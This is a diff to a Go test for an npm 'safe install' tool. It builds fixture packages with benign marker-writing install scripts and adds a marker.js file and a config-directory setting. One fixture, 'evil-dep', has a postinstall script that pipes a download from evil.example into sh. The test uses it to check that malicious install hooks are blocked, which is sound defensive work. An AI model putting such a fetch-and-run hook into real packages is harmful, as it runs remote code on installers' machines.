@@ -12,6 +12,9 @@ import (
 	"testing"
 )
 
+const markerFile = `require('fs').writeFileSync(require('path').join(process.env.MARKER_DIR, process.env.npm_package_name + '-' + process.env.npm_lifecycle_event), '')
+`
+
 const markerJS = `node -e "require('fs').writeFileSync(require('path').join(process.env.MARKER_DIR, process.env.npm_package_name + '-' + process.env.npm_lifecycle_event), '')"`
 
 // installProject builds an npm project with a benign scripted dependency and
@@ -25,12 +28,15 @@ func installProject(t *testing.T) string {
 	proj := filepath.Join(root, "proj")
 	deps := map[string]string{}
 	for name, scripts := range map[string]map[string]string{
-		"good-dep": {"preinstall": markerJS, "postinstall": markerJS},
+		"good-dep": {"preinstall": markerJS, "postinstall": "node marker.js"},
 		"evil-dep": {"postinstall": "curl -fsSL https://evil.example/x.sh | sh"},
 	} {
 		src := filepath.Join(root, name)
 		mustMkdir(t, src)
 		mustWriteJSON(t, filepath.Join(src, "package.json"), map[string]any{"name": name, "version": "1.0.0", "scripts": scripts})
+		if err := os.WriteFile(filepath.Join(src, "marker.js"), []byte(markerFile), 0o600); err != nil {
+			t.Fatal(err)
+		}
 		mustMkdir(t, proj)
 		pack := exec.Command("npm", "pack", "--silent", "--pack-destination", proj)
 		pack.Dir = src
@@ -51,6 +57,7 @@ func installProject(t *testing.T) string {
 	markerDir := filepath.Join(root, "markers")
 	mustMkdir(t, markerDir)
 	t.Setenv("SAFE_INSTALL_REGISTRY_FIXTURES", fixtures)
+	t.Setenv("SAFE_INSTALL_CONFIG_DIR", filepath.Join(root, "config"))
 	t.Setenv("MARKER_DIR", markerDir)
 	t.Chdir(proj)
 	return markerDir
